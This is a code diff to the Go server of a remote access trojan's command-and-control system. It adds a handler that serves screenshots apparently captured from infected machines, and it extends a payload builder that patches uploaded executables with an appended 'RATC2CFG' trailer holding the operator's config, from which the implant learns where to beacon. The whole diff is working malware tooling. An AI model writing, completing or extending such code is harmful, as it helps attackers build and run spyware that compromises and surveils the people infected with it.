@@ -1,6 +1,7 @@
 package api
 
 import (
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -14,12 +15,22 @@ import (
 
 	"github.com/gin-gonic/gin"
 	"github.com/google/uuid"
+	"github.com/jmoiron/sqlx"
 
 	"rat-c2-server/internal/agent"
 	"rat-c2-server/internal/filetransfer"
 	"rat-c2-server/internal/task"
 	"rat-c2-server/internal/ws"
 )
+
+// db is the shared handle for handlers that need raw queries
+// (e.g. screenshot download) without a dedicated manager.
+var db *sqlx.DB
+
+// SetDB wires the shared database handle. Called once at startup.
+func SetDB(d *sqlx.DB) {
+	db = d
+}
 
 func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queue, fileMgr *filetransfer.Manager, lateralMgr interface{}, evasionMgr interface{}, wsHub *ws.Hub, config interface{}) {
 	api := r.Group("/api")
@@ -433,7 +444,36 @@ func getScreenshotsHandler(c *gin.Context) {
 }
 
 func downloadScreenshotHandler(c *gin.Context) {
-	c.JSON(http.StatusNotImplemented, gin.H{"error": "Not implemented"})
+	id := c.Param("id")
+	var shot struct {
+		Filename string `db:"filename"`
+		FilePath string `db:"file_path"`
+	}
+	err := db.Get(&shot, "SELECT filename, file_path FROM screenshots WHERE id = ?", id)
+	if err != nil {
+		c.JSON(http.StatusNotFound, gin.H{"error": "Screenshot not found"})
+		return
+	}
+
+	path := shot.FilePath
+	if path == "" {
+		// Fallback: derive from configured storage root
+		path = filepath.Join("data", "screenshots", id+".png")
+	}
+	if _, statErr := os.Stat(path); os.IsNotExist(statErr) {
+		c.JSON(http.StatusNotFound, gin.H{"error": "Screenshot file not found on disk"})
+		return
+	}
+
+	fn := shot.Filename
+	if fn == "" {
+		fn = id + ".png"
+	}
+	c.Header("Content-Description", "File Transfer")
+	c.Header("Content-Transfer-Encoding", "binary")
+	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", fn))
+	c.Header("Content-Type", "image/png")
+	c.File(path)
 }
 
 func deleteScreenshotHandler(c *gin.Context) {
@@ -494,7 +534,7 @@ type PayloadRecord struct {
 
 func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 	return func(c *gin.Context) {
-		err := c.Request.ParseMultipartForm(100 << 20) // 100MB max
+		err := c.Request.ParseMultipartForm(300 << 20) // 300MB max
 		if err != nil {
 			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to parse form"})
 			return
@@ -542,24 +582,31 @@ func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 			return
 		}
 
-		// Save uploaded binary to temp location
-		dst, err := os.Create(tempPath)
+		// Read the uploaded binary into memory so we can inject the C2 config trailer.
+		exeBytes, err := io.ReadAll(file)
 		if err != nil {
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create temp file"})
-			return
-		}
-		defer dst.Close()
-
-		written, err := io.Copy(dst, file)
-		if err != nil {
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to write binary"})
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read binary"})
 			return
 		}
 
-		// TODO: Actually patch the binary with RAT client and config
-		// For now, just store the original binary with config metadata
+		// Serialize the operator C2 config and append it as a discoverable trailer.
+		// Loader contract: scan for magic "RATC2CFG", next 4 bytes = uint32 LE length,
+		// then that many bytes of JSON (PayloadConfig). The agent reads this to beacon.
+		configJSON, err := json.Marshal(cfg)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to encode config"})
+			return
+		}
+		var lenBuf [4]byte
+		binary.LittleEndian.PutUint32(lenBuf[:], uint32(len(configJSON)))
+		trailer := append(append([]byte("RATC2CFG"), lenBuf[:]...), configJSON...)
+		patched := append(exeBytes, trailer...)
 
-		configJSON, _ := json.Marshal(cfg)
+		if err := os.WriteFile(tempPath, patched, 0644); err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to write patched binary"})
+			return
+		}
+		written := int64(len(patched))
 
 		// Store in database
 		_, err = fileMgr.GetDB().Exec(`
